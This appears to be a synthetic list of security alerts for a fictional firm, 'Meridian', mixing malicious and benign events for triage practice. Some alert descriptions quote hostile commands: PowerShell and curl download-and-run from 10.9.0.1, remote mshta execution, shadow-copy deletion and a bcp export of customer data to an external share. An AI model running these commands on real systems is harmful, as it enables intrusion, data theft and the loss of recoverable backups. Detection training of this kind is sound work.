title: Encoded PowerShell via Office process
description: winword.exe spawned cmd.exe which executed powershell.exe -EncodedCommand ZQBjAGgAbwAgACIASABlAGwAbABvACIA. Parent process is a Microsoft Word instance opened from email attachment.

title: Outbound connection to Tor exit node
description: svchost.exe established outbound TCP connection to 185.220.101.42:443. Duration: 42 minutes. No established business use for this IP.

title: PSEXESVC service installed
description: Windows Service Control Manager created service PSEXESVC on MERIDIAN-SRV-FILE01. Source host: MERIDIAN-WKS-011. Event ID 7045.

title: Failed login: 5 attempts in 60 seconds
description: 5 failed Kerberos pre-authentication attempts for user jdoe@meridian.fin from workstation MERIDIAN-WKS-045. Account not locked out.

title: USB mass storage device connected
description: Unregistered USB mass storage device (SanDisk, 32GB) connected to MERIDIAN-WKS-007 in the Finance VLAN. No prior device registration.

title: Scheduled task created by non-admin user
description: Non-privileged user created scheduled task 'WindowsUpdate_Helper' with command: powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://10.9.0.1/stage2.ps1')

title: DCSync operation detected
description: Account svc_backup@meridian.fin performed a directory replication request (GetNCChanges) against domain controller MERIDIAN-SRV-DC01. This account does not have legitimate replication permissions.

title: Large file transfer to cloud storage
description: Browser process uploaded 2.3 GB to dropbox.com over 25 minutes from Finance VLAN workstation. User bchen@meridian.fin. DLP policy exception not on file.

title: Shadow copy deletion
description: vssadmin.exe Delete Shadows /All /Quiet executed on MERIDIAN-WKS-031. Parent process: ransomware.exe (unknown binary, not whitelisted).

title: Mass file rename with unknown extension
description: File system monitoring detected 847 files renamed with extension .meridianlock on MERIDIAN-WKS-031 within 30 seconds. Ransom note MERIDIAN_RESTORE.txt created in each directory.

title: Antivirus signature match: Emotet dropper
description: CrowdStrike Falcon detected and quarantined a file matching Emotet dropper signature (hash: 3d4f2bf07dc1be38b20cd6e46949a1b1) in user Downloads folder. File origin: email attachment received 4 hours ago.

title: DNS query to newly registered domain
description: Host MERIDIAN-WKS-033 queried update-checker.net (registered 72 hours ago). DNS resolved to 45.33.32.156. No business justification found.

title: Successful SSH login outside business hours
description: User devops_svc@meridian.fin logged in to jump host MERIDIAN-JUMP-02 via SSH at 03:20 UTC (outside business hours). Source IP: 198.51.100.44 (not on VPN whitelist).

title: Windows Defender disabled via registry
description: Registry key HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\DisableAntiSpyware set to 1 by process setup.exe (unknown, not whitelisted). Executed from TEMP directory.

title: SQL error spike: possible injection
description: Database server MERIDIAN-SRV-DB01 logged 143 SQL syntax errors in 5 minutes from application server MERIDIAN-APP-02 source IP. Error text includes UNION SELECT patterns.

title: Mimikatz signature in process memory
description: CrowdStrike detected Mimikatz credential dump signatures in memory of lsass.exe on MERIDIAN-WKS-041. Alert confidence: HIGH.

title: Impossible travel: authentication from two countries
description: User aparker@meridian.fin authenticated from Paris (06:00 CET) and New York (23:00 EST) within 18 minutes. Both sessions active simultaneously.

title: Curl download of executable from untrusted IP
description: cmd.exe executed: curl -o C:\Users\Public\update.exe http://10.9.0.1/update.exe && C:\Users\Public\update.exe. The IP 10.9.0.1 is not a Meridian asset.

title: Admin account created outside change window
description: Local administrator account 'support_temp' created on domain controller MERIDIAN-SRV-DC01 outside approved change window. Created by: SYSTEM (no attributed user).

title: Browser stored credential accessed by non-browser process
description: File C:\Users\jdoe\AppData\Local\Google\Chrome\User Data\Default\Login Data accessed by process credential_stealer.exe (unknown binary).

title: Normal software update: Adobe Acrobat
description: Adobe Acrobat Reader updated to version 24.001.20604 via AdobeARMservice. Update package digitally signed by Adobe Inc. No anomalous behaviour.

title: User changed own password
description: User rliu@meridian.fin changed their own password via the self-service portal during normal business hours. No policy violations detected.

title: Print spooler service restart
description: Windows Print Spooler service restarted on print server MERIDIAN-PRINT-01 after a configuration change pushed by IT via SCCM. Change ticket CHG-2025-1101 approved.

title: Low disk space on C: drive
description: C: drive on MERIDIAN-WKS-034 at 4% free space. Threshold: 10%. Triggered by monitoring agent. No security implications detected.

title: Scheduled backup completed
description: Nightly backup of MERIDIAN-SRV-FILE01 completed successfully at 07:20 UTC. 142 GB written to backup destination. No errors.

title: RDP connection from jump host
description: User itadmin@meridian.fin connected via RDP to MERIDIAN-WKS-071 from MERIDIAN-JUMP-01 (10.0.0.241). Approved jump host. Session recorded in PAM.

title: Script executed from startup folder
description: VBScript beacon.vbs executed from C:\Users\aparker\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup. File created 3 hours ago. Not a known software package.

title: Browser extension installed
description: Chrome extension 'PDF Converter Pro' (ID: mhjfbmdgcfjbbpaeojofohoefgiehjai) installed by user. Extension requests access to all website data and clipboard. Not on IT approved list.

title: certutil used to decode file
description: certutil.exe -decode encoded.txt decoded.exe executed on MERIDIAN-WKS-044 from a PowerShell session. Parent: powershell.exe. certutil is not used in any approved IT workflow.

title: Outbound SMTP to non-Meridian relay
description: Outlook.exe sent email via direct SMTP (port 25) to external relay 203.0.113.15, bypassing Meridian's internal mail relay. 3 emails in 5 minutes.

title: Web server config file modified
description: IIS web.config file on MERIDIAN-SRV-WEB01 modified at 09:10 UTC. Change attributed to deployment pipeline (CD-pipeline service account). Matches planned deployment in JIRA ticket DEP-2025-0822.

title: Named pipe created by unknown process
description: Unknown process exploit_helper.exe created named pipe \\.\pipe\ntsvcs mimicking a legitimate Windows pipe name. Process not in application whitelist.

title: Token impersonation by non-system process
description: Process injection_loader.exe performed SeImpersonatePrivilege token impersonation of SYSTEM token. Used by a non-Windows process from user TEMP directory.

title: Firewall rule added via netsh
description: netsh advfirewall firewall add rule name='Allow RDP inbound' protocol=TCP dir=in localport=3389 action=allow executed by non-admin user on MERIDIAN-WKS-025.

title: Macro execution in Excel document
description: Excel document report_q1_final_v3.xlsm executed VBA macro that called Shell() to launch cmd.exe. Macro was not in approved macro whitelist. Document received via email.

title: Database backup via BCP to network share
description: SQL Server backup using bcp.exe exported table CustomerAccounts (140,000 rows) to \\10.9.0.1\share\dump.csv. The destination IP is not a Meridian asset. Executed by svc_reporting account.

title: LOLBin: mshta.exe executing remote script
description: mshta.exe http://10.9.0.1/payload.hta executed on MERIDIAN-WKS-009 from a JavaScript attachment in email. mshta.exe is not used in any approved workflow.

title: Antivirus scan completed: no threats found
description: Scheduled full antivirus scan on MERIDIAN-FIN-11 completed. 148,223 files scanned. 0 threats detected. Duration: 47 minutes. Scan initiated by CrowdStrike policy.

title: Chrome remote debugging port opened
description: Google Chrome launched with --remote-debugging-port=9222 on MERIDIAN-WKS-047. The flag was passed by a script, not by a user. Allows session hijacking of browser cookies.

title: Container image pushed with root user
description: Docker image pushed to internal registry by build pipeline. Image analysis shows default user is root. Policy requires non-root user. Image tag: meridian-app:2025-05-22-dirty.

title: NTLMv1 authentication detected
description: Host MERIDIAN-WKS-060 used NTLMv1 authentication to access \\MERIDIAN-SRV-FILE01\Finance. NTLMv1 is disabled by policy; this indicates a misconfiguration or downgrade attack.

title: Patch Tuesday update applied
description: Microsoft KB5034441 applied to MERIDIAN-WKS-014 via WSUS. Reboot pending. No anomalous behaviour. Patch deployment matches approved maintenance window.

title: Memory dump of lsass.exe via Task Manager
description: Task Manager (Taskmgr.exe) created a memory dump of lsass.exe at C:\Users\helpdesk\Desktop\lsass.DMP. User helpdesk@meridian.fin does not have an approved reason for LSASS access.

title: WDigest authentication re-enabled
description: Registry key HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\UseLogonCredential set to 1 on MERIDIAN-WKS-029. This re-enables plaintext password storage in memory.

title: Remote thread injection into explorer.exe
description: Unknown process injector.exe (hash: abb0b5d57a1c3e0f9d6f5e2a4c8b3d7e) created a remote thread in explorer.exe on MERIDIAN-FIN-06. Injection technique matches Hollow Process pattern.

title: Slack desktop notification: login from new device
description: Slack sent a desktop notification to MERIDIAN-WKS-082: 'New login to your Slack account from Chrome on Windows, San Francisco.' User jsmith@meridian.fin reports being in London.

title: NTP server time drift detected
description: NTP server MERIDIAN-SRV-NTP01 reports time drift of 4.2 seconds vs external reference. Monitoring threshold: 5 seconds. Investigation recommended to prevent log timestamp skew.

title: Clipboard data exfil pattern: paste-to-browser
description: Clipboard monitoring detected 14 paste operations containing strings matching credit card number pattern (Luhn-valid) into browser field on external domain within 3 minutes.

title: Privileged database role granted without ticket
description: Database role db_owner granted to user reporting_svc@meridian.fin on MERIDIAN-SRV-DB02 without a corresponding change ticket. Granted by DBA account dba_admin@meridian.fin at 13:30 UTC.

title: EDR tamper: protection disabled via service stop
description: CrowdStrike Falcon sensor service (CSFalconService) stopped on MERIDIAN-WKS-055 at 13:40 UTC. Stopped by SYSTEM account. Real-time protection is now disabled on this host.
